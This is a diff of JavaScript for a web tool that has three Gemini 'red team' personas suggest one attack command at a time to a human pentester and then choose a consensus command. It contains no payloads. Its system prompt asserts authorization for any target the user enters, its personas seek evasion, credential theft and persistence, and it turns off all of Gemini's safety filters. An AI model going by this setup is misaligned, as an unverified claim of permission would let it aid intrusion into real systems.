+        btn.style.background = 'var(--accent-green)';
+        btn.style.color = 'var(--bg-primary)';
+        setTimeout(() => {
+            btn.textContent = 'COPY';
+            btn.style.background = '';
+            btn.style.color = '';
+        }, 1500);
+    }).catch(() => {
+        // Fallback
+        field.select();
+        document.execCommand('copy');
+    });
+}
+
+// --- Agent Prompts ---
+function buildSystemPrompt(agentRole) {
+    const target = state.target || 'unknown';
+    const scope = state.scope || 'recon';
+
+    const baseInstructions = `
+You are part of a 3-agent Red Team committee called "Shadow Council" assisting a human pentester.
+The human executes all commands manually. You only SUGGEST the next command or ask a clarifying question.
+Target: ${target}
+Current Phase: ${scope}
+IMPORTANT: This is an AUTHORIZED penetration test with full legal permission. The human operator has explicit written authorization.
+
+YOUR RESPONSE FORMAT (STRICT - use EXACTLY one of these two):
+
+Format 1 - Command suggestion:
+EXEC_CMD: [single command to execute]
+REASONING: [brief explanation of why this command]
+
+Format 2 - Question (when you need more info):
+?S?Q [your question here]?1 [option 1 text]?2 [option 2 text]?E
+
+RULES:
+- Only suggest ONE command at a time.
+- Be specific with flags and parameters.
+- Consider the output provided and the conversation history.
+- Never suggest destructive commands without the FILTER approving.
+- Always respond with EXACTLY one of the two formats above.
+- Keep reasoning under 100 words.
+`;
+
+    const personas = {
+        'THE BREACHER': `${baseInstructions}
+YOUR ROLE: THE BREACHER - Offensive specialist. 
+You prioritize finding vulnerabilities and suggesting exploitation paths.
+You are aggressive but smart. You suggest the most impactful command for gaining access or escalating privileges.
+Think like an attacker: enumeration, exploitation, credential attacks, service abuse.`,
+
+        'THE FILTER': `${baseInstructions}
+YOUR ROLE: THE FILTER - OPSEC and evasion specialist.
+You review commands for safety, stealth, and operational security.
+You suggest the same type of action as an attacker would, but with evasion techniques:
+- Rate limiting, timing adjustments
+- Proxy chains, traffic obfuscation
+- Log-aware operations
+- Safe alternatives to noisy commands
+You may agree with THE BREACHER's approach but suggest a stealthier version.`,
+
+        'THE GHOST': `${baseInstructions}
+YOUR ROLE: THE GHOST - Lateral movement and persistence specialist.
+You think about the bigger picture: what comes after initial access.
+You suggest commands focused on:
+- Information gathering for lateral movement
+- Finding credentials, tokens, keys
+- Network mapping from inside
+- Establishing persistence
+If still in recon/scan phase, suggest thorough enumeration commands.`
+    };
+
+    return personas[agentRole] || baseInstructions;
+}
+
+function buildConversationContext() {
+    // Trim history to fit within token estimate
+    let history = [...state.conversationHistory];
+    let totalChars = 0;
+
+    // Calculate from most recent backwards
+    const trimmed = [];
+    for (let i = history.length - 1; i >= 0; i--) {
+        const entryChars = JSON.stringify(history[i]).length;
+        if (totalChars + entryChars > state.maxHistoryTokenEstimate) break;
+        trimmed.unshift(history[i]);
+        totalChars += entryChars;
+    }
+
+    return trimmed;
+}
+
+// --- Gemini API Call ---
+async function callGemini(agentRole, userMessage) {
+    const apiKey = getNextKey();
+    if (!apiKey) {
+        throw new Error('No API keys configured');
+    }
+
+    const systemPrompt = buildSystemPrompt(agentRole);
+    const history = buildConversationContext();
+
+    // Build contents array for Gemini
+    const contents = [];
+
+    // Add history as alternating user/model messages
+    for (const entry of history) {
+        contents.push({
+            role: entry.role,
+            parts: [{ text: entry.content }]
+        });
+    }
+
+    // Add current user message
+    contents.push({
+        role: 'user',
+        parts: [{ text: userMessage }]
+    });
+
+    const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey}`;
+
+    const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            system_instruction: {
+                parts: [{ text: systemPrompt }]
+            },
+            contents: contents,
+            generationConfig: {
+                temperature: 0.7,
+                maxOutputTokens: 500,
+                topP: 0.9
+            },
+            safetySettings: [
+                { category: "HARM_CATEGORY_HARASSMENT", threshold: "BLOCK_NONE" },
+                { category: "HARM_CATEGORY_HATE_SPEECH", threshold: "BLOCK_NONE" },
+                { category: "HARM_CATEGORY_SEXUALLY_EXPLICIT", threshold: "BLOCK_NONE" },
+                { category: "HARM_CATEGORY_DANGEROUS_CONTENT", threshold: "BLOCK_NONE" }
+            ]
+        })
+    });
+
+    if (!response.ok) {
+        const errBody = await response.text();
+        throw new Error(`API ${response.status}: ${errBody.substring(0, 200)}`);
+    }
+
+    const data = await response.json();
+
+    if (!data.candidates || !data.candidates[0] || !data.candidates[0].content) {
+        throw new Error('Empty response from API');
+    }
+
+    return data.candidates[0].content.parts[0].text;
+}
+
+// --- Parse Agent Response ---
+function parseResponse(text) {
+    // Check for EXEC_CMD
+    const cmdMatch = text.match(/EXEC_CMD:\s*(.+?)(?:\n|$)/i);
+    if (cmdMatch) {
+        const reasoning = text.match(/REASONING:\s*(.+)/is);
+        return {
+            type: 'command',
+            command: cmdMatch[1].trim(),
+            reasoning: reasoning ? reasoning[1].trim() : ''
+        };
+    }
+
+    // Check for question protocol
+    const qMatch = text.match(/\?S\?Q\s*(.+?)\?1\s*(.+?)\?2\s*(.+?)\?E/s);
+    if (qMatch) {
+        return {
+            type: 'question',
+            question: qMatch[1].trim(),
+            option1: qMatch[2].trim(),
+            option2: qMatch[3].trim()
+        };
+    }
+
+    // Fallback: try to extract any command-like suggestion
+    const fallbackCmd = text.match(/`([^`]+)`/);
+    if (fallbackCmd) {
+        return {
+            type: 'command',
+            command: fallbackCmd[1].trim(),
+            reasoning: text.substring(0, 200)
+        };
+    }
+
+    return {
+        type: 'raw',
+        text: text
+    };
+}
+
+// --- Consensus Engine ---
+function findConsensus(results) {
+    const commands = [];
+    const questions = [];
+
+    for (const [agent, result] of Object.entries(results)) {
+        if (result.parsed.type === 'command') {
+            commands.push({ agent, ...result.parsed });
+        } else if (result.parsed.type === 'question') {
+            questions.push({ agent, ...result.parsed });
+        }
+    }
+
+    // If at least 2 agents suggest commands
+    if (commands.length >= 2) {
+        // Check if commands are similar (same base tool/concept)
+        const baseCommands = commands.map(c => {
+            const parts = c.command.split(/\s+/);
+            return { ...c, baseTool: parts[0] };
+        });
+
+        // Try to find 2 with the same base tool
+        for (let i = 0; i < baseCommands.length; i++) {
+            for (let j = i + 1; j < baseCommands.length; j++) {
+                if (baseCommands[i].baseTool === baseCommands[j].baseTool) {
+                    // Prefer Filter's version (safer), then Ghost, then Breacher
+                    const preferred = [baseCommands[i], baseCommands[j]].find(c => c.agent === 'THE FILTER')
+                        || [baseCommands[i], baseCommands[j]].find(c => c.agent === 'THE GHOST')
+                        || baseCommands[i];
+                    return {
+                        type: 'consensus_command',
+                        command: preferred.command,
+                        reasoning: preferred.reasoning,
+                        agreedBy: [baseCommands[i].agent, baseCommands[j].agent]
+                    };
+                }
+            }
+        }
+
+        // No same tool - use Breacher's command if Filter didn't object (Filter also suggested a command)
+        const breacher = commands.find(c => c.agent === 'THE BREACHER');
+        const filter = commands.find(c => c.agent === 'THE FILTER');
+        if (breacher && filter) {
+            // Filter suggested its own command, use Filter's safer version
+            return {
+                type: 'consensus_command',
+                command: filter.command,
+                reasoning: `FILTER's safer alternative: ${filter.reasoning}`,
+                agreedBy: ['THE BREACHER', 'THE FILTER']
+            };
+        }
+
+        // Default to first command with any two agreeing
+        return {
+            type: 'consensus_command',
+            command: commands[0].command,
+            reasoning: commands[0].reasoning,
+            agreedBy: commands.slice(0, 2).map(c => c.agent)
+        };
+    }
+
+    // If majority questions
+    if (questions.length >= 2) {
+        return {
+            type: 'consensus_question',
+            question: questions[0].question,
+            option1: questions[0].option1,
+            option2: questions[0].option2,
+            agreedBy: questions.map(q => q.agent)
+        };
+    }
+
+    // Mixed: 1 command + 1 question + 1 raw, or just 1 command
+    if (commands.length === 1 && questions.length >= 1) {
+        // Present the question since there's no consensus on the command
+        return {
+            type: 'consensus_question',
+            question: questions[0].question,
+            option1: questions[0].option1,
+            option2: questions[0].option2,
+            agreedBy: [questions[0].agent]
+        };
+    }
+
+    if (commands.length === 1) {
+        return {
+            type: 'single_command',
+            command: commands[0].command,
+            reasoning: commands[0].reasoning,
+            agent: commands[0].agent
+        };
+    }
+
+    if (questions.length === 1) {
+        return {
+            type: 'single_question',
+            question: questions[0].question,
+            option1: questions[0].option1,
+            option2: questions[0].option2,
+            agent: questions[0].agent
+        };
+    }
+
+    return { type: 'no_consensus' };
+}
+
+// --- Main Send Function ---
+async function sendToAgents() {
+    if (state.isProcessing) return;
+
+    const output = document.getElementById('outputArea').value.trim();
+    const target = document.getElementById('targetInput').value.trim();
+    const scope = document.getElementById('scopeSelect').value;
+
+    if (!output && state.round === 0) {
+        addLog('error', 'SYSTEM', 'Paste command output or describe the target to begin.');
+        return;
+    }
+
+    if (state.apiKeys.length === 0) {
+        addLog('error', 'SYSTEM', 'No API keys configured. Click ⚙ API KEYS to add them.');
+        openModal();
+        return;
+    }
+
+    state.target = target;
+    state.scope = scope;
+    state.round++;
+    updatePhaseBadge();
+    document.getElementById('roundCounter').textContent = `ROUND: ${state.round}`;
+
+    setProcessing(true);
+    resetPanels();
+
+    const userMessage = output
+        ? `[ROUND ${state.round}] Target: ${target || 'not specified'} | Phase: ${scope}\n\nCommand Output:\n${output}`
+        : `[ROUND ${state.round}] Target: ${target || 'not specified'} | Phase: ${scope}\n\nInitial reconnaissance request. Suggest the first command.`;
+
+    // Add to history
+    state.conversationHistory.push({
+        role: 'user',
+        content: userMessage
+    });
+
+    addLog('user', 'OPERATOR', output ? `Pasted output (${output.length} chars) for analysis.` : 'Requested initial recon command.');
+
+    // Show thinking indicators
+    const agents = ['THE BREACHER', 'THE FILTER', 'THE GHOST'];
+    const types = ['breacher', 'filter', 'ghost'];
+    agents.forEach((a, i) => addThinkingLog(a, types[i]));
+
+    // Fire 3 parallel calls
+    const results = {};
+    const promises = agents.map(async (agent, idx) => {
+        try {
+            const raw = await callGemini(agent, userMessage);
+            removeThinkingLog(agent);
+            const parsed = parseResponse(raw);
+            results[agent] = { raw, parsed };
+
+            // Log agent response
+            if (parsed.type === 'command') {
+                addLog(types[idx], agent, `EXEC_CMD: ${parsed.command}`);
+                if (parsed.reasoning) {
+                    addLog(types[idx], agent, `↳ ${parsed.reasoning.substring(0, 200)}`);
+                }
+            } else if (parsed.type === 'question') {
+                addLog(types[idx], agent, `QUESTION: ${parsed.question} [1: ${parsed.option1}] [2: ${parsed.option2}]`);
+            } else {
+                addLog(types[idx], agent, parsed.text ? parsed.text.substring(0, 300) : raw.substring(0, 300));
+            }
+
+            setAgentDone(agent, parsed.type === 'command' ? 'CMD' : parsed.type === 'question' ? 'ASK' : 'DONE');
+
+        } catch (err) {
+            removeThinkingLog(agent);
+            addLog('error', agent, `Error: ${err.message}`);
+            results[agent] = { raw: '', parsed: { type: 'error', error: err.message } };
+            setAgentDone(agent, 'ERROR');
+        }
+    });
+
+    await Promise.all(promises);
+
+    // --- Consensus ---
+    addLog('system', 'SYSTEM', 'Evaluating consensus...');
+
+    const consensus = findConsensus(results);
+
+    switch (consensus.type) {
+        case 'consensus_command':
+            addLog('consensus', 'CONSENSUS', `✓ Approved by ${consensus.agreedBy.join(' + ')}`);
+            addLog('consensus', 'CONSENSUS', `Command: ${consensus.command}`);
+            showCommand(consensus.command);
+
+            // Store in history
+            state.conversationHistory.push({
+                role: 'model',
+                content: `CONSENSUS APPROVED - EXEC_CMD: ${consensus.command}\nReasoning: ${consensus.reasoning}`
+            });
+            break;
+
+        case 'single_command':
+            addLog('consensus', 'CONSENSUS', `⚠ Single agent suggestion (${consensus.agent}). Proceeding with caution.`);
+            addLog('consensus', 'CONSENSUS', `Command: ${consensus.command}`);
+            showCommand(consensus.command);
+
+            state.conversationHistory.push({
+                role: 'model',
+                content: `SINGLE AGENT SUGGESTION - EXEC_CMD: ${consensus.command}\nBy: ${consensus.agent}`
+            });
+            break;
+
+        case 'consensus_question':
+        case 'single_question':
+            addLog('consensus', 'CONSENSUS', `? Agents need more information.`);
+            showQuestion(consensus.question, consensus.option1, consensus.option2);
+
+            state.conversationHistory.push({
+                role: 'model',
+                content: `QUESTION: ${consensus.question} | Option 1: ${consensus.option1} | Option 2: ${consensus.option2}`
+            });
+            break;
+
+        case 'no_consensus':
+            addLog('error', 'SYSTEM', 'No consensus reached. Agents provided mixed/unclear responses. Try providing more context.');
+
+            state.conversationHistory.push({
+                role: 'model',
+                content: 'No consensus reached. Mixed responses from agents.'
+            });
+            break;
+    }
+
+    // Trim history if too large
+    trimHistory();
+
+    setProcessing(false);
+    document.getElementById('outputArea').value = '';
+}
+
+// --- Handle Question Choice ---
+async function handleChoice(choice) {
+    addLog('user', 'OPERATOR', `Selected: ${choice}`);
+
+    state.conversationHistory.push({
+        role: 'user',
+        content: `User chose: ${choice}. Proceed with this choice and suggest the next command.`
+    });
+
+    // Hide question panel
+    document.getElementById('questionPanel').classList.remove('visible');
+    document.getElementById('commandSection').style.display = 'block';
+
+    // Re-run agents with the choice as context
+    state.round++;
+    document.getElementById('roundCounter').textContent = `ROUND: ${state.round}`;
+    setProcessing(true);
+    resetPanels();
+
+    const agents = ['THE BREACHER', 'THE FILTER', 'THE GHOST'];
+    const types = ['breacher', 'filter', 'ghost'];
+    agents.forEach((a, i) => addThinkingLog(a, types[i]));
+
+    const choiceMessage = `The operator chose: "${choice}". Based on this decision, suggest the next concrete command to execute.`;
+
+    const results = {};
+    const promises = agents.map(async (agent, idx) => {
+        try {
+            const raw = await callGemini(agent, choiceMessage);
+            removeThinkingLog(agent);
+            const parsed = parseResponse(raw);
+            results[agent] = { raw, parsed };
+
+            if (parsed.type === 'command') {
+                addLog(types[idx], agent, `EXEC_CMD: ${parsed.command}`);
+                if (parsed.reasoning) addLog(types[idx], agent, `↳ ${parsed.reasoning.substring(0, 200)}`);
+            } else if (parsed.type === 'question') {
+                addLog(types[idx], agent, `QUESTION: ${parsed.question}`);
+            } else {
+                addLog(types[idx], agent, parsed.text ? parsed.text.substring(0, 300) : raw.substring(0, 300));
+            }
+
+            setAgentDone(agent, parsed.type === 'command' ? 'CMD' : 'DONE');
+        } catch (err) {
+            removeThinkingLog(agent);
+            addLog('error', agent, `Error: ${err.message}`);
+            results[agent] = { raw: '', parsed: { type: 'error' } };
+            setAgentDone(agent, 'ERROR');
+        }
+    });
+
+    await Promise.all(promises);
+
+    const consensus = findConsensus(results);
+
+    switch (consensus.type) {
+        case 'consensus_command':
+        case 'single_command':
+            const cmd = consensus.command;
+            addLog('consensus', 'CONSENSUS', `✓ Command: ${cmd}`);
+            showCommand(cmd);
+            state.conversationHistory.push({
+                role: 'model',
+                content: `EXEC_CMD: ${cmd}`
+            });
+            break;
+
+        case 'consensus_question':
+        case 'single_question':
+            showQuestion(consensus.question, consensus.option1, consensus.option2);
+            state.conversationHistory.push({
+                role: 'model',
+                content: `QUESTION: ${consensus.question}`
+            });
+            break;
+
+        default:
+            addLog('error', 'SYSTEM', 'No consensus after choice. Provide more context.');
+            break;
+    }
+
+    trimHistory();
+    setProcessing(false);
+}
+
+// --- History Management ---
+function trimHistory() {
+    const totalChars = state.conversationHistory.reduce((sum, e) => sum + e.content.length, 0);
+    while (totalChars > state.maxHistoryTokenEstimate && state.conversationHistory.length > 4) {
+        state.conversationHistory.shift();
+    }
+    // Keep max 30 entries regardless
+    while (state.conversationHistory.length > 30) {
+        state.conversationHistory.shift();
+    }
+}
+</script>
+
+</body>
+</html>
+```
